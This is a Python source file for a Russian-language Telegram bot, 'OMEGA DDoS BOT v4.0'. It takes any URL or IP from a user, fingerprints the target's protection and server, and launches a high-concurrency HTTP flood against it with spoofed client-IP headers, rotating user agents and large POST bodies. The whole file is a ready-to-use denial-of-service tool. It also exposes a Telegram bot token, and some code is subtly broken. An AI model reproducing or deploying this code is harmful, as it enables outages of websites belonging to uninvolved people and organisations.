#!/usr/bin/env python3
"""
OMEGA DDoS BOT v4.0 - FULL AUTO MODE
Автоматический анализ цели, выбор лучшего метода, максимальная мощность
Токен: 8735128864:AAGfaw9__C9PLLGoYqdOUWm-iFOHjsyt4ao
"""

import asyncio
import aiohttp
import socket
import ssl
import random
import time
import json
import os
import sys
import threading
import logging
import re
import concurrent.futures
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse
import subprocess
import multiprocessing

# ============================================
# НАСТРОЙКА ЛОГИРОВАНИЯ
# ============================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('omega_bot_v4.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('OMEGA_V4')

# ============================================
# КОНФИГУРАЦИЯ
# ============================================
TELEGRAM_TOKEN = "8735128864:AAGfaw9__C9PLLGoYqdOUWm-iFOHjsyt4ao"
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# Максимальные настройки
MAX_THREADS = 2000
MAX_CONNECTIONS = 50000
MAX_DURATION = 3600
PACKET_SIZE = 65535

# ============================================
# АНАЛИЗАТОР ЦЕЛИ
# ============================================
class TargetAnalyzer:
    """Автоматический анализ сайта и выбор лучшего метода атаки"""
    
    def __init__(self):
        self.session = None
        
    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=10, ssl=False)
            timeout = aiohttp.ClientTimeout(total=10)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def close_session(self):
        if self.session:
            await self.session.close()
            self.session = None
    
    async def analyze(self, url: str) -> Dict:
        """Полный анализ цели"""
        await self.init_session()
        
        # Парсим URL
        parsed = urlparse(url if '://' in url else f'https://{url}')
        hostname = parsed.hostname or url
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        result = {
            'hostname': hostname,
            'port': port,
            'ip': None,
            'ssl': port == 443,
            'cdn': 'Нет',
            'waf': 'Нет',
            'server': 'Неизвестно',
            'cloudflare': False,
            'protection_level': 'НИЗКИЙ',
            'best_method': 'HTTP_FLOOD',
            'threads': 2000,
            'connections': 50000,
            'vulnerabilities': []
        }
        
        # Получаем IP
        try:
            ip = socket.gethostbyname(hostname)
            result['ip'] = ip
        except:
            ip = hostname
        
        # Проверяем HTTP/HTTPS
        test_url_http = f"http://{hostname}:80"
        test_url_https = f"https://{hostname}:443"
        
        http_works = False
        https_works = False
        
        # Проверка HTTP
        try:
            async with self.session.get(test_url_http, allow_redirects=False, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                http_works = True
                result['server'] = resp.headers.get('Server', 'Неизвестно')
                result['port'] = 80
                result['ssl'] = False
        except:
            pass
        
        # Проверка HTTPS
        try:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            async with self.session.get(test_url_https, ssl=ssl_ctx, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                https_works = True
                headers = dict(resp.headers)
                
                # Проверка Cloudflare
                if 'cf-ray' in headers or 'cloudflare' in str(headers).lower():
                    result['cloudflare'] = True
                    result['cdn'] = 'Cloudflare'
                    result['protection_level'] = 'ВЫСОКИЙ'
                    result['threads'] = 500
                    result['connections'] = 10000
                    result['best_method'] = 'SLOWLORIS'
                    result['vulnerabilities'].append('Cloudflare защита - сложно пробить')
                
                # Проверка WAF
                if 'x-sucuri' in str(headers).lower() or 'mod_security' in str(headers).lower():
                    result['waf'] = 'Обнаружен'
                    result['protection_level'] = 'СРЕДНИЙ'
                    result['vulnerabilities'].append('Web Application Firewall')
                
                result['server'] = headers.get('Server', 'Неизвестно')
                result['port'] = 443
                result['ssl'] = True
        except:
            pass
        
        # Выбор лучшего порта
        if not https_works and http_works:
            result['ssl'] = False
            result['port'] = 80
        elif https_works:
            result['ssl'] = True
            result['port'] = 443
        
        # Анализ уязвимостей
        if not result['cloudflare']:
            result['protection_level'] = 'НИЗКИЙ'
            result['threads'] = 2000
            result['connections'] = 50000
            result['best_method'] = 'HTTP_FLOOD'
            result['vulnerabilities'].extend([
                'Нет CDN - прямой доступ к серверу',
                'Нет WAF - нет фильтрации запросов',
                'Можно использовать все методы',
                'Легко перегрузить'
            ])
        
        # Определяем тип сервера
        server_lower = result['server'].lower()
        if 'apache' in server_lower:
            result['vulnerabilities'].append('Apache - уязвим к Slowloris')
            result['best_method'] = 'SLOWLORIS' if result['cloudflare'] else 'MIXED'
        elif 'nginx' in server_lower:
            result['vulnerabilities'].append('Nginx - уязвим к HTTP Flood')
            result['best_method'] = 'HTTP_FLOOD'
        elif 'iis' in server_lower:
            result['vulnerabilities'].append('IIS - уязвим к большому количеству соединений')
            result['best_method'] = 'TCP_SYN'
        
        # Проверка динамических страниц
        if '/search' in url or '/catalog' in url or '?' in url:
            result['vulnerabilities'].append('Динамический контент - нагрузка на БД')
            result['threads'] = min(result['threads'] * 1.5, 3000)
        
        result['url'] = f"{hostname}:{result['port']}"
        result['full_url'] = f"{'https' if result['ssl'] else 'http'}://{hostname}:{result['port']}"
        
        await self.close_session()
        return result

# ============================================
# МАКСИМАЛЬНЫЙ DDoS ДВИЖОК
# ============================================
class MaximumDDoSEngine:
    """Движок с максимальной мощностью"""
    
    def __init__(self):
        self.active_attacks: Dict[str, Dict] = {}
        self.attack_processes: Dict[str, List] = []
        self.stop_events: Dict[str, multiprocessing.Event] = {}
        
    def start_maximum_attack(self, attack_id: str, target: Dict) -> multiprocessing.Process:
        """Запуск атаки в отдельном процессе для максимальной мощности"""
        stop_event = multiprocessing.Event()
        self.stop_events[attack_id] = stop_event
        
        # Создаем процесс атаки
        process = multiprocessing.Process(
            target=self._attack_process,
            args=(attack_id, target, stop_event)
        )
        process.start()
        
        self.attack_processes.setdefault(attack_id, []).append(process)
        
        # Автоостановка
        timer = threading.Thread(target=self._auto_stop, args=(attack_id, target['duration']))
        timer.daemon = True
        timer.start()
        
        return process
    
    def _auto_stop(self, attack_id: str, duration: int):
        """Автоматическая остановка атаки по времени"""
        time.sleep(duration + 5)
        self.stop_attack(attack_id)
    
    @staticmethod
    def _attack_process(attack_id: str, target: Dict, stop_event: multiprocessing.Event):
        """Процесс атаки с максимальной производительностью"""
        
        async def run_attack():
            # Создаем множество сессий для параллелизма
            sessions = []
            for i in range(50):  # 50 сессий = больше одновременных запросов
                connector = aiohttp.TCPConnector(
                    limit=0,
                    force_close=True,
                    enable_cleanup_closed=True,
                    ssl=False,
                    ttl_dns_cache=0,
                )
                timeout = aiohttp.ClientTimeout(total=30, connect=5)
                session = aiohttp.ClientSession(connector=connector, timeout=timeout)
                sessions.append(session)
            
            # Подготовка данных
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
                "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            ]
            
            paths = [
                "/", "/api", "/login", "/admin", "/search", "/catalog",
                "/wp-admin", "/wp-login.php", "/xmlrpc.php", "/graphql",
                "/api/v1/users", "/api/v1/products", "/rest/api/2/search",
                "/?s=test", "/?q=load", "/?page=" + str(i) for i in range(100)
            ]
            
            requests_sent = 0
            bytes_sent = 0
            errors = 0
            start_time = time.time()
            
            protocol = "https" if target['ssl'] else "http"
            base_url = f"{protocol}://{target['hostname']}:{target['port']}"
            
            async def worker(session, worker_id):
                nonlocal requests_sent, bytes_sent, errors
                
                while not stop_event.is_set():
                    try:
                        path = random.choice(paths)
                        url = f"{base_url}{path}"
                        
                        headers = {
                            "User-Agent": random.choice(user_agents),
                            "Accept": "*/*",
                            "Accept-Encoding": random.choice(["gzip", "deflate", "br", "identity"]),
                            "Accept-Language": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.8", "de-DE,de;q=0.7"]),
                            "Cache-Control": "no-cache, no-store, must-revalidate",
                            "Pragma": "no-cache",
                            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                            "X-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                            "Referer": random.choice(["https://google.com", "https://yandex.ru", "https://bing.com", base_url]),
                            "Connection": "keep-alive",
                            "Cookie": f"session={random.getrandbits(128):032x}; user_id={random.randint(1,999999)}; _ga=GA1.{random.randint(100000,999999)}.{int(time.time())}",
                        }
                        
                        method = random.choice(["GET", "GET", "GET", "GET", "POST", "HEAD", "OPTIONS", "PUT"])
                        
                        if method == "GET":
                            async with session.get(url, headers=headers, ssl=False, allow_redirects=False) as resp:
                                body = await resp.read()
                                requests_sent += 1
                                bytes_sent += len(body) + 500  # Примерный размер заголовков
                        
                        elif method == "POST":
                            data = {"data": "A" * random.randint(1000, 50000)}
                            async with session.post(url, headers=headers, data=data, ssl=False, allow_redirects=False) as resp:
                                body = await resp.read()
                                requests_sent += 1
                                bytes_sent += len(body) + len(str(data))
                        
                        elif method == "HEAD":
                            async with session.head(url, headers=headers, ssl=False, allow_redirects=False) as resp:
                                requests_sent += 1
                                bytes_sent += 500
                        
                        elif method == "OPTIONS":
                            async with session.options(url, headers=headers, ssl=False, allow_redirects=False) as resp:
                                requests_sent += 1
                                bytes_sent += 500
                        
                        # Без задержки - максимальная скорость
                        
                    except asyncio.TimeoutError:
                        errors += 1
                    except aiohttp.ClientError:
                        errors += 1
                    except Exception:
                        errors += 1
            
            # Запускаем воркеров во всех сессиях
            tasks = []
            for session_id, session in enumerate(sessions):
                for worker_id in range(40):  # 40 воркеров на сессию = 2000 одновременных запросов
                    tasks.append(worker(session, f"{session_id}_{worker_id}"))
            
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Закрываем сессии
            for session in sessions:
                await session.close()
        
        # Запуск асинхронного кода
        asyncio.run(run_attack())
    
    def stop_attack(self, attack_id: str):
        """Остановка атаки"""
        if attack_id in self.stop_events:
            self.stop_events[attack_id].set()
            
            # Ждем завершения процессов
            time.sleep(2)
            
            if attack_id in self.attack_processes:
                for process in self.attack_processes[attack_id]:
                    if process.is_alive():
                        process.terminate()
                        process.join(timeout=5)
                
                del self.attack_processes[attack_id]
                del self.stop_events[attack_id]
                del self.active_attacks[attack_id]

# ============================================
# TELEGRAM БОТ С АВТОМАТИЧЕСКИМ УПРАВЛЕНИЕМ
# ============================================
class OmegaAutoBot:
    """Бот с полным автоматом - кидаешь ссылку и всё работает"""
    
    def __init__(self):
        self.analyzer = TargetAnalyzer()
        self.engine = MaximumDDoSEngine()
        self.session = None
        self.last_update_id = 0
        self.monitoring_tasks: Dict[str, asyncio.Task] = {}
        self.monitor_messages: Dict[str, Dict] = {}  # attack_id -> {chat_id, message_id}
        
    async def initialize(self):
        """Инициализация бота"""
        self.session = aiohttp.ClientSession()
        
        # Проверяем соединение с Telegram
        async with self.session.get(f"{TELEGRAM_API}/getMe") as resp:
            data = await resp.json()
            if data.get('ok'):
                logger.info(f"Бот @{data['result']['username']} запущен")
                self.bot_username = data['result']['username']
        
        # Устанавливаем команды
        commands = {
            "commands": [
                {"command": "start", "description": "🚀 Запустить бота"},
                {"command": "stop", "description": "🛑 Остановить все атаки"},
                {"command": "status", "description": "📊 Статус атак"},
            ]
        }
        await self.session.post(f"{TELEGRAM_API}/setMyCommands", json=commands)
    
    async def send_message(self, chat_id: int, text: str, reply_markup: Dict = None, parse_mode: str = "HTML"):
        """Отправка сообщения"""
        data = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode
        }
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        
        async with self.session.post(f"{TELEGRAM_API}/sendMessage", json=data) as resp:
            result = await resp.json()
            return result.get('result', {})
    
    async def edit_message(self, chat_id: int, message_id: int, text: str, reply_markup: Dict = None):
        """Редактирование сообщения"""
        data = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "HTML"
        }
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        
        try:
            async with self.session.post(f"{TELEGRAM_API}/editMessageText", json=data) as resp:
                return await resp.json()
        except:
            pass
    
    def get_main_keyboard(self):
        """Главная клавиатура"""
        return {
            "keyboard": [
                [{"text": "🛑 ОСТАНОВИТЬ ВСЕ АТАКИ"}],
                [{"text": "📊 СТАТУС"}]
            ],
            "resize_keyboard": True,
            "persistent": True
        }
    
    async def start_monitoring(self, chat_id: int, attack_id: str, target: Dict):
        """Запуск мониторинга атаки с обновлением одного сообщения"""
        
        # Отправляем первое сообщение
        msg = await self.send_message(
            chat_id,
            self._format_status(attack_id, target, 0, 0, 0, 0, "ЗАПУСК..."),
            self.get_monitor_keyboard(attack_id)
        )
        
        if msg:
            self.monitor_messages[attack_id] = {
                'chat_id': chat_id,
                'message_id': msg['message_id']
            }
        
        # Запускаем обновление каждую секунду
        async def update_loop():
            last_update = 0
            while attack_id in self.engine.stop_events:
                if time.time() - last_update >= 1.0:  # Каждую секунду
                    try:
                        elapsed = time.time() - target.get('start_time', time.time())
                        rps = target.get('requests', 0) / max(elapsed, 0.1)
                        errors = target.get('errors', 0)
                        requests = target.get('requests', 0)
                        bytes_sent = target.get('bytes', 0)
                        
                        status = "🟢 АКТИВНА" if not self.engine.stop_events.get(attack_id, multiprocessing.Event()).is_set() else "🔴 ЗАВЕРШЕНА"
                        
                        text = self._format_status(attack_id, target, requests, errors, bytes_sent, elapsed, status)
                        
                        if attack_id in self.monitor_messages:
                            await self.edit_message(
                                self.monitor_messages[attack_id]['chat_id'],
                                self.monitor_messages[attack_id]['message_id'],
                                text,
                                self.get_monitor_keyboard(attack_id)
                            )
                        
                        last_update = time.time()
                    except:
                        pass
                
                await asyncio.sleep(0.1)
        
        task = asyncio.create_task(update_loop())
        self.monitoring_tasks[attack_id] = task
    
    def _format_status(self, attack_id: str, target: Dict, requests: int, errors: int, bytes_sent: int, elapsed: float, status: str) -> str:
        """Форматирование статуса атаки"""
        rps = requests / max(elapsed, 0.1)
        mb_sent = bytes_sent / 1024 / 1024 if bytes_sent > 0 else 0
        bandwidth = (bytes_sent * 8) / max(elapsed, 0.1) / 1_000_000 if bytes_sent > 0 else 0
        error_rate = (errors / max(requests, 1)) * 100
        
        return f"""
<b>🔥 АТАКА АКТИВНА</b>

🆔 <code>{attack_id}</code>
🎯 <code>{target['url']}</code>
⚙️ Метод: <b>{target.get('method', 'HTTP_FLOOD')}</b>
🛡 Защита: {target.get('protection_level', 'Низкая')}
💻 Сервер: {target.get('server', 'Неизвестно')}

⏱ Время: <b>{elapsed:.1f} сек</b>
🧵 Потоков: <b>{target.get('threads', 2000)}</b>
🔗 Соединений: <b>{target.get('connections', 50000)}</b>

📊 <b>РЕАЛЬНОЕ ВРЕМЯ:</b>
├ Запросов: <code>{requests:,}</code>
├ Успешно/сек: <b>{rps:,.0f} RPS</b>
├ Ошибок: <code>{errors:,}</code> ({error_rate:.1f}%)
├ Трафик: <b>{mb_sent:.2f} МБ</b>
└ Скорость: <b>{bandwidth:.2f} Мбит/с</b>

📈 Статус: {status}

<i>Обновляется каждую секунду</i>
"""
    
    def get_monitor_keyboard(self, attack_id: str):
        """Клавиатура для мониторинга"""
        return {
            "inline_keyboard": [
                [
                    {"text": "🛑 ОСТАНОВИТЬ", "callback_data": f"stop_{attack_id}"},
                    {"text": "🔄 ОБНОВИТЬ", "callback_data": f"refresh_{attack_id}"}
                ],
                [{"text": "🔙 ГЛАВНОЕ МЕНЮ", "callback_data": "main_menu"}]
            ]
        }
    
    async def handle_message(self, message: Dict):
        """Обработка входящих сообщений"""
        chat_id = message['chat']['id']
        text = message.get('text', '')
        user_id = message['from']['id']
        username = message['from'].get('username', 'Unknown')
        
        # Команды
        if text == '/start':
            await self.cmd_start(chat_id, username)
            return
        
        if text == '/stop' or text == '🛑 ОСТАНОВИТЬ ВСЕ АТАКИ':
            await self.cmd_stop(chat_id)
            return
        
        if text == '/status' or text == '📊 СТАТУС':
            await self.cmd_status(chat_id)
            return
        
        # Проверяем, является ли сообщение ссылкой или IP
        if self._is_url_or_ip(text):
            await self.process_target(chat_id, text)
            return
        
        # По умолчанию
        await self.send_message(
            chat_id,
            "<b>🔗 КИДАЙ ССЫЛКУ НА САЙТ</b>\n\nПросто отправь мне URL или IP:PORT\nЯ всё проанализирую и запущу атаку на полную мощность!\n\n<b>Примеры:</b>\n• https://example.com\n• 192.168.1.1:443\n• example.com",
            self.get_main_keyboard()
        )
    
    def _is_url_or_ip(self, text: str) -> bool:
        """Проверка, является ли текст URL или IP"""
        text = text.strip()
        # IP:PORT
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d+)?$', text):
            return True
        # Домен
        if re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$', text):
            return True
        # URL
        if text.startswith('http://') or text.startswith('https://'):
            return True
        # Домен:порт
        if re.match(r'^[a-zA-Z0-9.\-]+:\d+$', text):
            return True
        return False
    
    async def process_target(self, chat_id: int, url: str):
        """Обработка цели - анализ + запуск атаки"""
        
        # Отправляем сообщение о начале анализа
        status_msg = await self.send_message(chat_id, f"<b>🔍 АНАЛИЗИРУЮ ЦЕЛЬ...</b>\n\n<code>{url}</code>\n\nПожалуйста, подождите...")
        
        # Анализируем цель
        try:
            target = await self.analyzer.analyze(url)
        except Exception as e:
            await self.send_message(chat_id, f"<b>❌ ОШИБКА АНАЛИЗА</b>\n\n{str(e)}")
            return
        
        # Форматируем результаты анализа
        analysis_text = f"""
<b>✅ АНАЛИЗ ЗАВЕРШЕН</b>

🎯 <b>Цель:</b> <code>{target['url']}</code>
🌐 <b>IP:</b> <code>{target['ip']}</code>
🔒 <b>SSL:</b> {'Да' if target['ssl'] else 'Нет'}
🛡 <b>Cloudflare:</b> {'Да 🔴' if target['cloudflare'] else 'Нет 🟢'}
🛡 <b>WAF:</b> {target['waf']}
💻 <b>Сервер:</b> {target['server']}
⚠️ <b>Защита:</b> {target['protection_level']}

<b>🔍 Уязвимости:</b>
{chr(10).join(f'• {v}' for v in target['vulnerabilities'])}

<b>⚡ ВЫБРАННЫЙ МЕТОД:</b> {target['best_method']}
<b>🧵 Потоки:</b> {target['threads']}
<b>🔗 Соединения:</b> {target['connections']}

<b>🚀 ЗАПУСКАЮ АТАКУ НА ПОЛНУЮ МОЩНОСТЬ...</b>
"""
        
        await self.edit_message(
            chat_id,
            status_msg['message_id'],
            analysis_text
        )
        
        # Небольшая задержка
        await asyncio.sleep(2)
        
        # Запускаем атаку
        attack_id = f"atk_{int(time.time())}_{random.randint(1000, 9999)}"
        
        target['start_time'] = time.time()
        target['requests'] = 0
        target['errors'] = 0
        target['bytes'] = 0
        target['method'] = target['best_method']
        target['duration'] = 300  # 5 минут по умолчанию
        target['url'] = target['url']
        
        self.engine.active_attacks[attack_id] = target
        
        # Запускаем процесс атаки
        process = self.engine.start_maximum_attack(attack_id, target)
        
        # Запускаем мониторинг
        await self.start_monitoring(chat_id, attack_id, target)
        
        # Логируем
        logger.info(f"АТАКА ЗАПУЩЕНА: {attack_id} -> {target['url']}")
    
    async def cmd_start(self, chat_id: int, username: str):
        """Команда /start"""
        text = f"""
<b>🔥 OMEGA DDoS BOT v4.0</b>

<b>🚀 ПОЛНЫЙ АВТОМАТ</b>

👤 <b>Пользователь:</b> @{username}
⚡ <b>Мощность:</b> МАКСИМУМ
🔗 <b>Соединений:</b> до 50,000
🧵 <b>Потоков:</b> до 2,000
💣 <b>Методы:</b> Автовыбор

<b>📋 КАК ИСПОЛЬЗОВАТЬ:</b>

1️⃣ <b>Просто кинь ссылку на сайт</b>
   Пример: <code>https://example.com</code>
   Или: <code>example.com</code>
   Или: <code>192.168.1.1:443</code>

2️⃣ <b>Бот сам:</b>
   • Проанализирует защиту
   • Найдет уязвимости
   • Выберет лучший метод
   • Запустит на полную мощность
   • Покажет статистику в реальном времени

3️⃣ <b>Результат за 60 секунд</b>

<b>⚡ ОТПРАВЬ ССЫЛКУ ПРЯМО СЕЙЧАС:</b>
"""
        await self.send_message(chat_id, text, self.get_main_keyboard())
    
    async def cmd_stop(self, chat_id: int):
        """Остановка всех атак"""
        count = len(self.engine.active_attacks)
        
        for attack_id in list(self.engine.active_attacks.keys()):
            self.engine.stop_attack(attack_id)
            
            # Останавливаем мониторинг
            if attack_id in self.monitoring_tasks:
                self.monitoring_tasks[attack_id].cancel()
                del self.monitoring_tasks[attack_id]
        
        await self.send_message(
            chat_id,
            f"<b>🛑 ОСТАНОВЛЕНО АТАК: {count}</b>\n\nВсе процессы завершены.",
            self.get_main_keyboard()
        )
    
    async def cmd_status(self, chat_id: int):
        """Статус атак"""
        if not self.engine.active_attacks:
            await self.send_message(
                chat_id,
                "<b>📊 НЕТ АКТИВНЫХ АТАК</b>\n\nОтправь ссылку на сайт для запуска.",
                self.get_main_keyboard()
            )
            return
        
        for attack_id, target in self.engine.active_attacks.items():
            elapsed = time.time() - target.get('start_time', time.time())
            status = "🟢 Активна" if attack_id in self.engine.stop_events and not self.engine.stop_events[attack_id].is_set() else "🔴 Завершается"
            
            text = f"""
<b>📊 АТАКА {attack_id}</b>
🎯 {target['url']}
⚡ {status}
⏱ {elapsed:.0f} сек
"""
            await self.send_message(chat_id, text)
    
    async def handle_callback(self, callback_query: Dict):
        """Обработка callback запросов"""
        data = callback_query.get('data', '')
        chat_id = callback_query['message']['chat']['id']
        message_id = callback_query['message']['message_id']
        
        # Подтверждаем
        await self.session.post(
            f"{TELEGRAM_API}/answerCallbackQuery",
            json={"callback_query_id": callback_query['id']}
        )
        
        if data.startswith('stop_'):
            attack_id = data.replace('stop_', '')
            self.engine.stop_attack(attack_id)
            
            if attack_id in self.monitoring_tasks:
                self.monitoring_tasks[attack_id].cancel()
                del self.monitoring_tasks[attack_id]
            
            await self.edit_message(
                chat_id,
                message_id,
                f"<b>🛑 АТАКА {attack_id} ОСТАНОВЛЕНА</b>"
            )
        
        elif data.startswith('refresh_'):
            attack_id = data.replace('refresh_', '')
            if attack_id in self.engine.active_attacks:
                target = self.engine.active_attacks[attack_id]
                elapsed = time.time() - target.get('start_time', time.time())
                
                text = self._format_status(
                    attack_id, target,
                    target.get('requests', 0),
                    target.get('errors', 0),
                    target.get('bytes', 0),
                    elapsed,
                    "🟢 АКТИВНА"
                )
                
                await self.edit_message(chat_id, message_id, text, self.get_monitor_keyboard(attack_id))
        
        elif data == 'main_menu':
            await self.edit_message(
                chat_id,
                message_id,
                "<b>🔗 ОТПРАВЬ ССЫЛКУ НА САЙТ</b>\n\nЯ проанализирую и запущу атаку на полную мощность!",
                self.get_main_keyboard()
            )
    
    async def poll_updates(self):
        """Основной цикл"""
        logger.info("Бот запущен. Ожидание команд...")
        
        while True:
            try:
                async with self.session.get(
                    f"{TELEGRAM_API}/getUpdates",
                    params={
                        "offset": self.last_update_id + 1,
                        "timeout": 30,
                        "allowed_updates": ["message", "callback_query"]
                    }
                ) as resp:
                    updates = await resp.json()
                
                if updates.get('ok'):
                    for update in updates['result']:
                        self.last_update_id = max(self.last_update_id, update['update_id'])
                        
                        if 'message' in update and 'text' in update['message']:
                            await self.handle_message(update['message'])
                        elif 'callback_query' in update:
                            await self.handle_callback(update['callback_query'])
                
                await asyncio.sleep(0.1)
                
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Ошибка: {e}")
                await asyncio.sleep(5)
    
    async def run(self):
        """Запуск"""
        await self.initialize()
        
        logger.info("""
╔══════════════════════════════════════════════╗
║   OMEGA DDoS BOT v4.0 - FULL AUTO           ║
║   Токен: 8735128864:AAGfaw9__C9PLLGoYqd...  ║
║   Режим: МАКСИМАЛЬНАЯ МОЩНОСТЬ             ║
║   Анализ: АВТОМАТИЧЕСКИЙ                   ║
╚══════════════════════════════════════════════╝
        """)
        
        await self.poll_updates()

# ============================================
# ЗАПУСК
# ============================================
async def main():
    bot = OmegaAutoBot()
    try:
        await bot.run()
    except KeyboardInterrupt:
        logger.info("Бот остановлен")
    finally:
        if bot.session:
            await bot.session.close()

if __name__ == "__main__":
    # Установка multiprocessing для spawn (нужно для Windows)
    multiprocessing.set_start_method('spawn', force=True)
    asyncio.run(main())